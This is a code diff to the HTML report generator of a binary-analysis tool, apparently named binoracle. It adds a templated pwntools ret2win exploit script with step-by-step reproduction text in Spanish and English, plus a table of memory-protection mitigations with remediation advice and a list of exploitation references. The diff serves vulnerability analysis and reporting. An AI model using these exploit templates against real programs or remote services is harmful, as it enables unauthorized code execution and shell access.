@@ -85,6 +85,98 @@ def _decompiled_html(decompiled) -> str:
     return f'<h2 data-i18n="decompiled"></h2>{cards}'
 
 
+import re as _re_mod
+
+
+def _exploit_section(binary: str, findings, lang: str) -> str:
+    """Reproduccion paso a paso + script pwntools del exploit verificado (si lo hay)."""
+    vf = next((f for f in findings if f.verdict == "verified" and "ret2win" in (f.title + f.evidence).lower()), None)
+    if vf is None:
+        return ""
+    m = _re_mod.search(r"offset\s*=\s*(\d+)", vf.evidence or "")
+    off = int(m.group(1)) if m else None
+    mw = _re_mod.search(r"win\s*=\s*(0x[0-9a-fA-F]+)", (vf.location or "") + " " + (vf.evidence or ""))
+    win = mw.group(1) if mw else "0x0"
+    name = _esc(_os_basename(binary))
+    T = _EXP_STR.get(lang, _EXP_STR["es"])
+    steps = "".join(f'<li>{s}</li>' for s in T["steps"](off if off is not None else "N", win))
+    script = (f'from pwn import *\n'
+              f'context.binary = elf = ELF("./{name}")\n\n'
+              f'# io = remote("HOST", PORT)      # {T["remote"]}\n'
+              f'io = process("./{name}")          # {T["local"]}\n\n'
+              f'offset = {off if off is not None else "N"}{" "*3}# {T["offc"]}\n'
+              f'payload  = b"A" * offset\n'
+              f'payload += p64(elf.sym.win)       # ret2win -> {win}\n'
+              f'# {T["align"]}\n'
+              f'# payload = b"A"*offset + p64(RET) + p64(elf.sym.win)\n\n'
+              f'io.sendline(payload)\n'
+              f'io.interactive()                  # -> shell')
+    return (f'<h2 data-i18n="exploit_steps"></h2>'
+            f'<div class="expwrap"><div class="expcol"><div class="panel-t">{T["repro"]}</div>'
+            f'<ol class="steps">{steps}</ol></div>'
+            f'<div class="expcol"><div class="panel-t">{T["script"]}</div>'
+            f'<pre class="code">{_esc(script)}</pre></div></div>')
+
+
+def _mit_detail(mit: dict, lang: str) -> str:
+    """Cada mitigacion: estado, que implica para explotacion y como remediar."""
+    T = _MIT_STR.get(lang, _MIT_STR["es"])
+    rows = ""
+    order = ["NX", "PIE", "Canary", "RELRO"]
+    for k in order:
+        v = mit.get(k)
+        info = T[k](v)
+        cls = info["cls"]
+        rows += (f'<tr class="mitrow {cls}"><td class="mk">{_esc(k)}</td>'
+                 f'<td class="mstate">{_esc(info["state"])}</td>'
+                 f'<td>{_esc(info["impact"])}</td>'
+                 f'<td class="mrem">{_esc(info["rem"])}</td></tr>')
+    return (f'<h2 data-i18n="mit_detail"></h2>'
+            f'<table class="mittab"><thead><tr><th>{T["h_mit"]}</th><th>{T["h_state"]}</th>'
+            f'<th>{T["h_impact"]}</th><th>{T["h_rem"]}</th></tr></thead><tbody>{rows}</tbody></table>')
+
+
+# Mapa tecnica -> cheat sheets del RAG + fuentes autoritativas.
+_REF_MAP = {
+    "ret2win": (["ret2win", "rop"], []),
+    "overflow": (["mitigations", "pie", "canary-bypass"], []),
+    "read": (["mitigations", "shellcoding"], []),
+    "system": (["got-plt"], []),
+    "rop": (["rop", "advanced-rop", "syscall-table"], []),
+    "format": (["format-string", "got-plt"], []),
+    "heap": (["heap", "modern-heap", "heap-version-matrix"], ["shellphish/how2heap"]),
+    "kernel": (["kernel-pwn", "kernel-mitigations"], ["xairy/linux-kernel-exploitation"]),
+}
+
+
+def _references(findings, lang: str) -> str:
+    """Referencias: cheat sheets del RAG relevantes a lo detectado + fuentes autoritativas."""
+    blob = " ".join((f.title + " " + (f.evidence or "") + " " + (f.location or "")) for f in findings).lower()
+    sheets, ext = [], []
+    for key, (sh, ex) in _REF_MAP.items():
+        if key in blob:
+            for s in sh:
+                if s not in sheets:
+                    sheets.append(s)
+            for e in ex:
+                if e not in ext:
+                    ext.append(e)
+    if not sheets:
+        sheets = ["methodology", "mitigations"]
+    T = _REF_STR.get(lang, _REF_STR["es"])
+    chips = "".join(f'<code class="refchip">binoracle kb "{_esc(s)}"</code>' for s in sheets)
+    extl = "".join(f'<li>{_esc(e)}</li>' for e in ext)
+    ext_html = f'<div class="panel-t" style="margin-top:12px">{T["ext"]}</div><ul class="reflist">{extl}</ul>' if ext else ""
+    return (f'<h2 data-i18n="references"></h2>'
+            f'<p class="mut" style="font-size:12px">{T["note"]}</p>'
+            f'<div class="refchips">{chips}</div>{ext_html}')
+
+
+def _os_basename(p: str) -> str:
+    import os as _os
+    return _os.path.basename(p) or "binary"
+
+
 def _evidence_html(ev: str) -> str:
     """Render finding evidence as a labelled terminal block, with the oracle sources it
     came from shown as chips and a colour cue for angr/debugger-proven evidence."""
@@ -243,6 +335,9 @@ def render_html(binary: str, triage=None, findings: Optional[List[Finding]] = No
                       f'<p class="poc-note" data-i18n="poc_note"></p>{cards_p}')
 
     decompiled_html = _decompiled_html(decompiled)
+    exploit_html = _exploit_section(binary, findings, lang)
+    mit_detail_html = _mit_detail(mit, lang)
+    references_html = _references(findings, lang)
     answer_html = f'<div class="panel md summary"><div class="panel-t" data-i18n="exec_summary"></div>{_md(answer)}</div>' if answer else ""
     sev_buttons = "".join(
         f'<button class="fbtn" data-f="{s}" onclick="flt(this)"><i style="background:{_SEV_COLOR[s]}"></i>'
@@ -280,6 +375,8 @@ def render_html(binary: str, triage=None, findings: Optional[List[Finding]] = No
 
   {proof_html}
 
+  {exploit_html}
+
   {decompiled_html}
 
   <h2 data-i18n="findings"></h2>
@@ -289,8 +386,12 @@ def render_html(binary: str, triage=None, findings: Optional[List[Finding]] = No
   </div>
   <div id="cards">{cards or '<p class="empty" data-i18n="no_findings"></p>'}</div>
 
+  {mit_detail_html}
+
   <h2 data-i18n="attack_surface"></h2>
   {triage_sections or '<p class="empty" data-i18n="no_triage"></p>'}
+
+  {references_html}
 
   <h2 data-i18n="evidence_trail"></h2>
   {trail or '<p class="empty" data-i18n="no_trail"></p>'}
@@ -345,6 +446,9 @@ _I18N = {
         "poc_note": "Captura de la ejecucion real en sandbox aislado que DEMUESTRA el exploit "
                     "(shell / flag / objetivo alcanzado). Evidencia reproducible, no teorica.",
         "decompiled": "Decompilacion anotada (funcion vulnerable)",
+        "exploit_steps": "Exploit paso a paso",
+        "mit_detail": "Mitigaciones y remediacion",
+        "references": "Referencias",
         "findings": "Hallazgos", "attack_surface": "Superficie de ataque",
         "evidence_trail": "Rastro de evidencia (grounding)",
         "rationale": "Razonamiento", "evidence": "Evidencia", "recommendation": "Recomendacion",
@@ -365,6 +469,9 @@ _I18N = {
         "poc_note": "Capture of the real execution in an isolated sandbox that PROVES the exploit "
                     "(shell / flag / goal reached). Reproducible evidence, not theoretical.",
         "decompiled": "Annotated decompilation (vulnerable function)",
+        "exploit_steps": "Exploit step by step",
+        "mit_detail": "Mitigations and remediation",
+        "references": "References",
         "findings": "Findings", "attack_surface": "Attack surface",
         "evidence_trail": "Evidence trail (grounding)",
         "rationale": "Rationale", "evidence": "Evidence", "recommendation": "Recommendation",
@@ -376,6 +483,117 @@ _I18N = {
         "footer": "Generated by binoracle. Every fact is attributed to the oracle that produced it.",
     },
 }
+
+def _mst(v):  # estado legible de una mitigacion booleana/str
+    if v is None:
+        return "?"
+    if isinstance(v, bool):
+        return "ON" if v else "OFF"
+    return str(v).upper()
+
+
+_EXP_STR = {
+    "es": {
+        "repro": "Reproduccion paso a paso", "script": "Exploit (pwntools)",
+        "remote": "en remoto", "local": "en local",
+        "offc": "bytes hasta la direccion de retorno guardada",
+        "align": "Si crashea por alineacion de pila (movaps), inserta un gadget 'ret' antes:",
+        "steps": lambda off, win: [
+            "<b>checksec</b>: NX activo (no shellcode en pila), sin canary (overflow directo pisa "
+            "RIP), sin PIE (direcciones fijas). Conclusion: ret2win viable.",
+            f"<b>Localizar la gift</b>: funcion <code>win()</code> en <code>{win}</code> que ejecuta "
+            "<code>system(\"/bin/sh\")</code>.",
+            f"<b>Hallar el offset</b> hasta la direccion de retorno guardada: <code>{off}</code> "
+            "(tamano del buffer + rbp guardado). Verificado por ejecucion en sandbox.",
+            f"<b>Construir el payload</b>: <code>{off}</code> bytes de relleno + la direccion de "
+            "<code>win()</code>.",
+            "<b>Ejecutar en sandbox aislado</b> (Docker, sin red): se obtiene shell (uid=0). "
+            "Ver la captura en 'Prueba de explotacion' arriba.",
+        ],
+    },
+    "en": {
+        "repro": "Step-by-step reproduction", "script": "Exploit (pwntools)",
+        "remote": "remote", "local": "local",
+        "offc": "bytes to the saved return address",
+        "align": "If it crashes on stack alignment (movaps), insert a 'ret' gadget first:",
+        "steps": lambda off, win: [
+            "<b>checksec</b>: NX on (no stack shellcode), no canary (overflow overwrites RIP "
+            "directly), no PIE (fixed addresses). So: ret2win is viable.",
+            f"<b>Locate the gift</b>: <code>win()</code> at <code>{win}</code> running "
+            "<code>system(\"/bin/sh\")</code>.",
+            f"<b>Find the offset</b> to the saved return address: <code>{off}</code> (buffer size + "
+            "saved rbp). Verified by sandbox execution.",
+            f"<b>Build the payload</b>: <code>{off}</code> filler bytes + the address of "
+            "<code>win()</code>.",
+            "<b>Run in an isolated sandbox</b> (Docker, no network): a shell is obtained (uid=0). "
+            "See the capture under 'Exploitation proof' above.",
+        ],
+    },
+}
+
+
+def _mrow_es(state, impact, rem, cls):
+    return {"state": state, "impact": impact, "rem": rem, "cls": cls}
+
+
+_MIT_STR = {
+    "es": {
+        "h_mit": "Mitigacion", "h_state": "Estado", "h_impact": "Implicacion para explotacion",
+        "h_rem": "Remediacion",
+        "NX": lambda v: _mrow_es(_mst(v),
+            "Sin shellcode en pila/heap; hay que reutilizar codigo (ROP/ret2libc)." if v not in (False,)
+            else "Pila/heap ejecutables: puedes saltar a shellcode inyectado.",
+            "Mantener NX (-z noexecstack)." if v not in (False,) else "Activar NX: enlazar con -z noexecstack.",
+            "ok" if v not in (False,) else "bad"),
+        "PIE": lambda v: _mrow_es(_mst(v),
+            "Codigo en direccion fija: hardcodea PLT/GOT/gadgets sin leak." if v in (False,)
+            else "Codigo reubicado: necesitas un leak para saltar mitigaciones.",
+            "Compilar con -pie -fPIE (y ASLR del SO)." if v in (False,) else "Mantener PIE.",
+            "bad" if v in (False,) else "ok"),
+        "Canary": lambda v: _mrow_es(_mst(v),
+            "El overflow lineal pisa la direccion de retorno directamente." if v in (False,)
+            else "Hay que filtrar o forzar el canary antes de pisar RIP.",
+            "Compilar con -fstack-protector-strong." if v in (False,) else "Mantener el canary.",
+            "bad" if v in (False,) else "ok"),
+        "RELRO": lambda v: _mrow_es(_mst(v),
+            "GOT escribible: GOT overwrite / ret2dlresolve posibles." if str(v).lower() != "full"
+            else "GOT de solo lectura: sin GOT overwrite (ve por FSOP/exit-handlers).",
+            "Enlazar con -Wl,-z,relro,-z,now (Full RELRO)." if str(v).lower() != "full" else "Mantener Full RELRO.",
+            "warn" if str(v).lower() == "partial" else ("bad" if str(v).lower() in ("none", "no") else "ok")),
+    },
+    "en": {
+        "h_mit": "Mitigation", "h_state": "State", "h_impact": "Exploitation implication",
+        "h_rem": "Remediation",
+        "NX": lambda v: _mrow_es(_mst(v),
+            "No stack/heap shellcode; must reuse code (ROP/ret2libc)." if v not in (False,)
+            else "Executable stack/heap: you can jump to injected shellcode.",
+            "Keep NX (-z noexecstack)." if v not in (False,) else "Enable NX: link with -z noexecstack.",
+            "ok" if v not in (False,) else "bad"),
+        "PIE": lambda v: _mrow_es(_mst(v),
+            "Code at a fixed address: hardcode PLT/GOT/gadgets, no leak needed." if v in (False,)
+            else "Relocated code: you need a leak.",
+            "Compile with -pie -fPIE (and OS ASLR)." if v in (False,) else "Keep PIE.",
+            "bad" if v in (False,) else "ok"),
+        "Canary": lambda v: _mrow_es(_mst(v),
+            "A linear overflow overwrites the return address directly." if v in (False,)
+            else "You must leak or brute-force the canary first.",
+            "Compile with -fstack-protector-strong." if v in (False,) else "Keep the canary.",
+            "bad" if v in (False,) else "ok"),
+        "RELRO": lambda v: _mrow_es(_mst(v),
+            "Writable GOT: GOT overwrite / ret2dlresolve possible." if str(v).lower() != "full"
+            else "Read-only GOT: no GOT overwrite (use FSOP/exit-handlers).",
+            "Link with -Wl,-z,relro,-z,now (Full RELRO)." if str(v).lower() != "full" else "Keep Full RELRO.",
+            "warn" if str(v).lower() == "partial" else ("bad" if str(v).lower() in ("none", "no") else "ok")),
+    },
+}
+
+_REF_STR = {
+    "es": {"note": "Cheat sheets del RAG local relevantes a lo detectado (consultables con el "
+                   "comando de abajo) y fuentes autoritativas.", "ext": "Fuentes autoritativas"},
+    "en": {"note": "Local RAG cheat sheets relevant to what was found (query with the command "
+                   "below) and authoritative sources.", "ext": "Authoritative sources"},
+}
+
 
 _CSS = """
 :root{--bg:#f6f7f9;--panel:#ffffff;--fg:#1a2027;--mut:#6b7683;--line:#e3e7ec;--acc:#2f6feb;--code:#f0f2f5;--codefg:#243b53}
@@ -446,6 +664,23 @@ pre{background:var(--code);border:1px solid var(--line);border-radius:8px;paddin
 .decfn .md p{margin:5px 0}
 pre.code{background:#0b0e12;color:#cfe3ff;border:1px solid var(--line);border-radius:8px;padding:11px;overflow:auto;font:12px/1.5 ui-monospace,monospace;white-space:pre}
 .decfn .sec{margin:8px 15px 14px}
+.expwrap{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+@media(max-width:760px){.expwrap{grid-template-columns:1fr}}
+.expcol{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:14px}
+ol.steps{margin:6px 0 0;padding-left:20px}
+ol.steps li{margin:0 0 9px;padding-left:4px}
+ol.steps code{background:var(--code);padding:1px 5px;border-radius:4px;font:12px ui-monospace,monospace;color:var(--codefg)}
+.mittab{width:100%;border-collapse:collapse;font-size:13px;background:var(--panel);border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.mittab th{text-align:left;padding:9px 12px;background:var(--code);color:var(--mut);font-size:11px;text-transform:uppercase;letter-spacing:.04em;border-bottom:1px solid var(--line)}
+.mittab td{padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+.mittab tr:last-child td{border-bottom:0}
+.mittab .mk{font-weight:700}
+.mittab .mstate{font-weight:700;font-family:ui-monospace,monospace}
+.mittab .mrem{color:var(--mut)}
+.mitrow.ok .mstate{color:#2f9e5f}.mitrow.bad .mstate{color:#e5484d}.mitrow.warn .mstate{color:#e5a000}
+.refchips{display:flex;flex-wrap:wrap;gap:8px}
+.refchip{background:var(--code);border:1px solid var(--line);border-radius:7px;padding:5px 10px;color:var(--codefg);font:12px ui-monospace,monospace}
+ul.reflist{margin:6px 0 0;padding-left:20px;color:var(--mut);font-size:13px}
 .proof{border:1px solid #1f7a4d;border-radius:10px;overflow:hidden;background:#0b0e12;margin:10px 0;box-shadow:0 0 0 1px rgba(48,163,108,.15)}
 .proof-h{display:flex;align-items:center;gap:9px;padding:9px 13px;background:#0e1a13;border-bottom:1px solid #1f7a4d;flex-wrap:wrap}
 .proof-ok{color:#30d67f;font-weight:800}
